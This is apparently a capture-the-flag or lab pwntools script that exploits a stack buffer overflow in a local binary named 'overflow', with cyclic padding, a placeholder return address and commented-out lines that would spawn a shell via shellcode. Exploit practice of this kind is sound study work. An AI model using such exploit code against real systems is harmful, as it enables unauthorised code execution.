from pwn import *

p = process("./overflow")
print(p.recv())
raw_input("attach gdb")

# padding = cyclic(0xff+0xf)
padding = "A" * cyclic_find("aaagaaah")

RIP = p64(0x4242424243434343)

# context(arch = 'amd64', os = 'linux')
# shellcode = asm(shellcraft.amd64.linux.sh())
# runner = run_shellcode(shellcode)
# runner.interactive()
# runner.wait_for_close()
# runner.poll()

p.sendline("hi\x00" + padding + RIP)
p.interactive()